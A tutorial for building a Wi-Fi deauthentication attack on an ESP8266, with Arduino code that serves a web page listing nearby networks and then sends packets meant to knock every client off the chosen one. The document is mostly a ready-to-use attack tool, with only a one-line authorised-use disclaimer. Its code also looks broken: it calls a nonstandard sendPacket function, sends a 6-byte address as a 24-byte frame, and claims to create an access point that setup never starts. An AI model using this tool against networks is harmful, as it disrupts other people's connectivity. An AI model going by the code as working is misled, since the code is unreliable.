# ESP8266 Deauthentication Attack via Web GUI

This guide explains how to perform a deauthentication attack using an ESP8266 and the Arduino IDE, with network selection via a web-based GUI.

## Requirements

- ESP8266 board (e.g., NodeMCU)
- Arduino IDE
- USB cable to connect the ESP8266 to your computer
- Computer or mobile device to access the web interface

## Setup

1. **Install the ESP8266 Board in Arduino IDE**:
   - Open the Arduino IDE.
   - Go to `File` > `Preferences`.
   - In the "Additional Board Manager URLs" field, add: `http://arduino.esp8266.com/stable/package_esp8266com_index.json`
   - Go to `Tools` > `Board` > `Boards Manager`.
   - Search for "esp8266" and install the board package.

2. **Select the Correct Board and Port**:
   - Go to `Tools` > `Board` and select your ESP8266 board (e.g., `NodeMCU 1.0 (ESP-12E Module)`).
   - Go to `Tools` > `Port` and select the correct port for your ESP8266.

3. **Upload the Code**:
   - Copy the provided code into a new sketch in the Arduino IDE.
   - Upload the sketch to your ESP8266.

## Code

```cpp
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

ESP8266WebServer server(80);

void handleRoot() {
  String html = "<!DOCTYPE HTML>\
                   <html>\
                   <body>\
                   <h1>Select Target Network</h1>\
                   <form action=\"/select\" method=\"post\">\
                   <select name=\"network\">";

  int n = WiFi.scanNetworks();
  if (n == 0) {
    html += "<option value=\"none\">No networks found</option>";
  } else {
    for (int i = 0; i < n; ++i) {
      html += "<option value=\"" + String(i) + "\">" + WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + ")</option>";
    }
  }

  html += "</select>\
           <input type=\"submit\" value=\"Select\">\
           </form>\
           </body>\
           </html>";

  server.send(200, "text/html", html);
}

void handleSelect() {
  if (server.hasArg("network")) {
    int targetIndex = server.arg("network").toInt();
    const char* targetSSID = WiFi.SSID(targetIndex).c_str();
    server.send(200, "text/plain", "Targeting network: " + String(targetSSID));

    // Send deauthentication packets to the broadcast address
    uint8_t broadcasting[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    WiFi.begin(targetSSID);
    WiFi.sendPacket(broadcasting, 24, true);
  } else {
    server.send(400, "text/plain", "Bad Request");
  }
}

void setup() {
  Serial.begin(115200);
  delay(10);

  // Start WiFi in station mode to scan for networks
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  // Start the web server
  server.on("/", handleRoot);
  server.on("/select", HTTP_POST, handleSelect);
  server.begin();
  Serial.println("Web server started");
}

void loop() {
  server.handleClient();

  // Send deauthentication packets to the broadcast address
  uint8_t broadcasting[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  WiFi.sendPacket(broadcasting, 24, true);

  delay(1000); // Wait for 1 second before sending the next packet
}
```
## Usage

### 1. Connect to ESP8266
- Power on the ESP8266.
- The ESP8266 creates its own Wi-Fi access point.
- Connect your computer to this network.
- Default SSID format: `ESP_xxxxxx`

---

### 2. Open Web Interface
- Open a web browser.
- Navigate to:

```http://192.168.4.1```

(or the IP address assigned to the ESP8266).

---

### 3. Select Target Network
- The web page displays a list of scanned Wi-Fi networks.
- Each entry shows the network index, SSID, and signal strength (RSSI).
- Select the target network from the dropdown.
- Click **Select** to submit your choice.

---

### 4. Perform Deauthentication
- After selection, the ESP8266 sends deauthentication packets to the broadcast address of the selected network.
- This disrupts all clients currently connected to that network.

---

## Example Web Interface
```
### Select Target Network

1: network1 (-45)
2: network2 (-50) *
3: network3 (-60)
4: network4 (-70) *
5: network5 (-80)
```

`*` indicates selected or highlighted networks.

---

## Notes
- Use a stable power supply, as continuous deauthentication increases power consumption.
- Effectiveness depends on distance and signal strength.
- Nearby Wi-Fi traffic may interfere and reduce impact.

---

## Disclaimer
This project is intended for learning, testing, and demonstration on networks you own or are authorized to test.

Unauthorized use may result in legal consequences.
